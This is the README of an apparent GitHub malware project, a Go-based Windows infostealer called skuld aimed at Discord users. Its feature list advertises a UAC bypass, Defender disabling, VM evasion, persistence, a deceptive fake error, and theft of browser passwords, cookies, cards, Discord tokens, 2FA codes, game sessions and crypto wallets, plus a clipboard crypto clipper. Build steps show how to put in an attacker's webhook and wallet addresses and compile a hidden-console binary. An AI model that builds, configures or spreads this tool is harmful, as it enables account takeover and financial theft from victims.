## About the project

This proof of concept project demonstrates a "Discord-oriented" stealer implemented in Go, a language not commonly utilized for such purposes on GitHub. The malware is designed to operate on Windows systems and employs a method involving privilege escalation, specifically leveraging the well-known Fodhelper technique. By elevating privileges, the malware gains access to sensitive user data stored in all user sessions on every disk

### Features:

- **UAC Bypass:** Grants privileges to steal user data from others users. üïµÔ∏è‚Äç‚ôÇÔ∏è
- **Console hiding:** Module to hide the console. üï∂Ô∏è
- **Fake Error Simulation:** Trick user into believing the program closed due to an error. üé≠
- **Startup Persistence:** Ensures the program runs at system startup. üöÄ
- **Anti-debugging Measures:** Detects and exits when running in virtual machines (VMs). üîç
- **Antivirus Evasion:** Attempts to disable Windows Defender and block access to antivirus websites. ü¶†
- **System Information Retrieval:** Gathers CPU, GPU, RAM, IP, location, saved Wi-Fi networks, and more. üñ•Ô∏è
- **Chromium-based Browsers Data Theft:** Steals logins, cookies, credit cards, history, and download lists from 36 Chromium-based browsers.
- **Gecko Browsers Data Theft:** Steals logins, cookies, history, and download lists from 9 Gecko browsers. ü¶ä
- **Common Files Theft:** Steals sensitive files from common locations. üóÇÔ∏è
- **Discord Backup Codes Theft:** Captures Discord Two-Factor Authentication (2FA) backup codes. üîë
- **Wallet Data Theft:** Steals data from 10 local wallets and 55 wallet extensions. üí∞
- **Discord Tokens Theft:** Extracts tokens from 4 Discord applications, Chromium, and Gecko browsers.
- **Games Data Theft:** Extracts Epic Games, Uplay, Minecraft (14 launchers) and Riot Games sessions. üéÆ
- **[Discord Injection:](https://github.com/hackirby/discord-injection)**
  - Intercepts login, register, and 2FA login requests.
  - Captures backup codes requests.
  - Monitors email/password change requests.
  - Intercepts credit card/PayPal addition requests.
  - Blocks the use of QR codes for login.
  - Prevents requests to view devices.
- **[Crypto Wallets Injection:](https://github.com/hackirby/wallets-injection)**
  - Captures mnemonic phrases.
  - Captures passwords.
- **Crypto Clipper:** Replaces the user's clipboard content with a specified crypto address when copying another address. üìã

## Getting started

### Prerequisites

- [The Go Programming Language](https://go.dev/)

### Installation
To install this project using Git, follow these steps:

- Clone the Repository:

Open your terminal or command prompt and run the following command to clone the repository to your local machine:

```bash
git clone https://github.com/hackirby/skuld
```
- Navigate to the Project Directory:

```bash
cd skuld
```

- Open `main.go` and edit config with your Discord webhook and your crypto addresses

- Build the Project template:

```bash
go build
```

You can reduce binary size by using these flags
```bash
go build -ldflags "-s -w"
```

and hide the console by using this flag
```bash
go build -ldflags "-H=windowsgui"
```

## Usage
A template is available at `main.go`, but you can also use skuld in your own Go code. Just import the desired module like this:
```go
package main

import (
  "github.com/hackirby/skuld/modules/hideconsole"
)

func main() {
  hideconsole.Run()
}
```
